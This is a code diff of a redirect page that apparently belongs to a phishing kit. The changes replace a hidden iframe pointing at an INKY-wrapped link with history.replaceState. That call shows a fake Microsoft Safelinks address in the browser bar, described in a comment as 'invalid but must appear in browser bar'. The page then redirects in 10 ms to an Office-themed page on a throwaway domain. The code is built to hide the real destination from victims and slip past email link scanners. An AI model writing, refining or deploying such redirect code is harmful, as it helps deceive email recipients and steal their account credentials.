@@ -5,13 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <script>
-        // First temporary redirect URL (never visible to the user)
-        const firstRedirectUrl = "https://shared.outlook.inky.com/link?domain=m3.ryltvk6.sa.com&t=h.eJxNj00OgyAQha_SsK7QESroyqvAMKipigFcNb17S9NFl-_vS96TnWllw4XNpRx5ECLjTP5cqYnJU2rQ7kfMhWfLMW7iSLEQliafaSLuI2Z2vbBHBexUPs1FLHuI4098N2BvzijVd4j3tncudL31wSiwZHUAEKCl0RpabbiU0CpZmVSZiRytyz6NG25QYTXxNfk3Sj0ArzfMMz7v.MEUCICEI6i6CrVDJsTqv-D44iSjB0FjCgezb02LsAX3GOiU0AiEAwjl5CQtCOIupbdWlks66hThKXby0D20e3FdLQidqhHo";
+        // First URL (invalid but must appear in browser bar)
+        const firstRedirectUrl = "https://nam13.safelinks.protection.outlook.com/?url=https%3A%2F%2F2n8w.app.link%2F&data=05%7C02%";
 
-        // Final destination URL
+        // Final destination URL (where the user should end up)
         const finalRedirectUrl = "https://m3.ryltvk6.sa.com/m3.secure.zcore/office-3D8/index.php";
 
-        // Function to generate a random string (80 characters)
+        // Function to generate a random 80-character string
         function generateRandomString(length) {
             const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
             let result = "";
@@ -35,16 +35,13 @@
             // Generate a random 80-character string
             const randomString = generateRandomString(80);
 
-            // First redirect (hidden)
-            const hiddenIframe = document.createElement("iframe");
-            hiddenIframe.style.display = "none";
-            hiddenIframe.src = firstRedirectUrl;
-            document.body.appendChild(hiddenIframe);
+            // Step 1: Change the browser URL without navigating
+            window.history.replaceState(null, "", firstRedirectUrl);
 
-            // Redirect to final URL within 100ms (effectively instant)
+            // Step 2: Instantly redirect to the final URL
             setTimeout(() => {
                 window.location.replace(`${finalRedirectUrl}?=${randomString}`);
-            }, 100);
+            }, 10);
         }
     </script>
 </head>
